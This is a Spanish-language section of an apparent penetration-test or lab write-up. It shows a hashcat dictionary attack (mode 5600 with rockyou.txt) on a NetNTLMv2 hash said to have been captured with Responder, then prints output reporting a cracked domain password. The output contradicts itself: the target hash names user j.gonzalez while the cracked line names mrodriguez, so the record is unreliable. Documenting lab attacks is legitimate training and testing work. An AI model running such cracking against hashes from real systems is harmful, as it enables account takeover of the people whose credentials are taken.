# Desencriptación 

En esta fase utilizaremos Hashcat para realizar el cracking del hash NTLMv2 capturado durante la etapa anterior, utilizando un ataque basado en diccionario para determinar la contraseña asociada al material de autenticación obtenido.

## Comando Utilizado

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Parámetros:**

| Parámetro | Descripción |
|---|---|
| `-m 5600` | Modo de hash NetNTLMv2 |
| `hash.txt` | Archivo con el hash capturado por Responder |
| `rockyou.txt` | Diccionario de contraseñas comunes |

## Resultado

```
hashcat (v7.1.2) starting

Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: j.gonzalez::RAYNEX:1122334455667788:7F8A91B2C3D4E5F60123456789ABCDEF:0101000000000000...
Time.Started.....: Thu Sep 24 01:12:41 2026
Time.Estimated...: Thu Sep 24 01:13:18 2026
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)

Progress.........: 1438720/14344391
Speed.#1.........: 385.4 kH/s
Recovered........: 1/1 (100.00%)
Status...........: Cracked

mrodriguez::RAYNEX:1122334455667788:7F8A91B2C3D4E5F60123456789ABCDEF:0101000000000000...:R@ynex2026!

Session..........: hashcat
Status...........: Cracked
```

